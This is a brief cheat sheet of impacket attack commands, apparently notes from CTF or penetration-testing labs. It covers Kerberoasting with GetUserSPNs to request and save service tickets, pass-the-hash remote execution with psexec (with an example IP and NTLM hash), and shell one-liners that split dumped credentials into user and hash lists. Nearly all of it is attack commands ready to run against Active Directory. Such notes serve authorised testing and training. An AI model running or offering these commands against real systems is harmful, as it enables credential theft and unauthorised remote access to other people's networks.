## impacket

#### Basic commands

**Kerberoasting - Listing kerberoasts user accounts:**

```
impacket-GetUserSPNs <domain>/<user>:<pass>> -dc-ip <ip> -request
```

**Kerberoasting - Getting kerberoastable accounts > output to tickets.txt**

```
impacket-GetUserSPNs soupedecode.local/<user>:<pass> -dc-ip <ip> -request -output tickets.txt
```

**Kerberoasting - Getting RCE with kerberoast username and hash**

```
impacket-psexec '<user>$'@$<ip> -hashes '<hash>'
```

*example*

```
impacket-psexec 'FileServer$'@10.10.110.164 -hashes 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559
```
#### Formatting Commands for credentials
**if found list of extracted kerberoast username and hashes in full format:**

```
cat backup_extract.txt | cut -d ':' -f 1 > extracted_users.txt
```

```
cat backup_extract.txt | cut -d ':' -f 4 | awk '{print "00000000000000000000000000000000:"$1}' > extracted_hashes.txt
```
